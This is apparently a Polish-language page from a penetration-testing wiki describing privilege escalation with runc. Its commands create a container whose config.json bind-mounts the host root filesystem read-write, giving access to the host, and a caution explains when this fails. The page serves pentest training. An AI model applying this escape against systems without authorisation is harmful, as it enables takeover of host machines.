# Eskalacja uprawnień RunC

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

Jeśli chcesz dowiedzieć się więcej o **runc**, sprawdź następującą stronę:


{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Jeśli zauważysz, że `runc` jest zainstalowany na hoście, możesz być w stanie **uruchomić kontener, montując folder root / hosta**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Nie zawsze będzie to działać, ponieważ domyślne działanie runc polega na uruchamianiu jako root, więc uruchomienie go jako użytkownik nieuprzywilejowany po prostu nie może działać (chyba że używana jest konfiguracja rootless). Ustawienie konfiguracji rootless jako domyślnej na ogół nie jest dobrym pomysłem, ponieważ wewnątrz kontenerów rootless obowiązuje dość wiele ograniczeń, które nie mają zastosowania poza kontenerami rootless.

{{#include ../../banners/hacktricks-training.md}}
